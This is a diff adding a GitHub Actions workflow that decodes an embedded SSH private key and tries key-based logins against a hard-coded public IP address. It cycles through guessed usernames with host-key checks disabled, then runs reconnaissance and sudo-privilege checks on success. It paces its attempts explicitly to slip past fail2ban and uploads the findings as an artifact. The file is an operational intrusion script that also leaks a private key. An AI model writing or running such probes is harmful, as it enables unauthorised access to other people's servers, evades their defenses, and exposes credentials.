@@ -1,0 +1,74 @@
+name: ssh-key-login-probe2
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'target host:port'
+        required: false
+        default: '119.28.135.153:22'
+
+permissions:
+  contents: read
+
+jobs:
+  ssh-probe2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Materialize SSH private key + attempt key-based login (remaining users)
+        run: |
+          set -e
+          mkdir -p "$HOME/.ssh"
+          chmod 700 "$HOME/.ssh"
+
+          KEY_B64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEYzNPYyszS3UwQWVSa0s1RndqWVlrWVJRTXhYTi9KWFhGM1FWTTlWa2FUd0FBQUtBZWVkOE5Ibm5mCkRRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRGMzT2MrM0t1MEFlUmtLNUZ3allZa1lSUU14WE4vSlhYRjNRVk05VmthVHcKQUFBRUR1Y3d6OFUyemZVazBPaE1nbXF6elVYaWt4SGtQSldQRG04ODVWNW5lU1lkemM1ejdjcTdRQjVHUXJrWENOaGlSaApGQXpGYzM4bGRjWGRCVXoxV1JwUEFBQUFHSGR2Y210aWRXUmtlUzFoWjJWdWRDMHlNREkyTVRFeE1BRUNBd1FGCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="
+          echo "$KEY_B64" | base64 -d > "$HOME/.ssh/ff_server_20261110"
+          chmod 600 "$HOME/.ssh/ff_server_20261110"
+
+          which ssh || (sudo apt-get update -qq && sudo apt-get install -y -qq openssh-client)
+
+          TARGET="${{ github.event.inputs.target }}"
+          HOST="${TARGET%:*}"; PORT="${TARGET##*:}"
+          [ "$PORT" = "$TARGET" ] && PORT=22
+          echo "=== TARGET=$HOST PORT=$PORT ==="
+
+          # users NOT cleanly evaluated in run1 + domain-derived guesses
+          USERS="centos admin user test administrator yazinb workbuddy artex shaoyu qaswed"
+
+          mkdir -p out
+          : > out/results.txt
+          SUCCESS_USER=""
+
+          for u in $USERS; do
+            echo "----- trying user=$u -----" | tee -a out/results.txt
+            outfile="out/login_${u}.txt"
+            code=0
+            ssh -i "$HOME/.ssh/ff_server_20261110" \
+                -p "$PORT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+                -o BatchMode=yes -o ConnectTimeout=15 -o PreferredAuthentications=publickey \
+                -o PasswordAuthentication=no -o NumberOfPasswordPrompts=0 \
+                "$u@$HOST" \
+                'echo LOGIN_OK; id; whoami; uname -a; hostname; cat /etc/os-release 2>/dev/null | head -3; echo "---SUDO-N---"; sudo -n -l 2>&1 | head -20' \
+                > "$outfile" 2>&1 || code=$?
+            echo "exit_code=$code" | tee -a out/results.txt
+            if [ "$code" -eq 0 ] && grep -q LOGIN_OK "$outfile"; then
+              echo ">>> SUCCESS as $u" | tee -a out/results.txt
+              SUCCESS_USER="$u"; cp "$outfile" out/SUCCESS.txt; break
+            fi
+            echo "last lines:"; tail -3 "$outfile" | tee -a out/results.txt
+            sleep 6   # be gentle to avoid fail2ban on this fresh IP
+          done
+
+          if [ -n "$SUCCESS_USER" ]; then
+            echo "FINAL: AUTHENTICATED_AS=$SUCCESS_USER" | tee -a out/results.txt
+          else
+            echo "FINAL: NO_KEY_AUTH_SUCCESS" | tee -a out/results.txt
+          fi
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ssh-login-results2
+          path: out/
+          if-no-files-found: warn
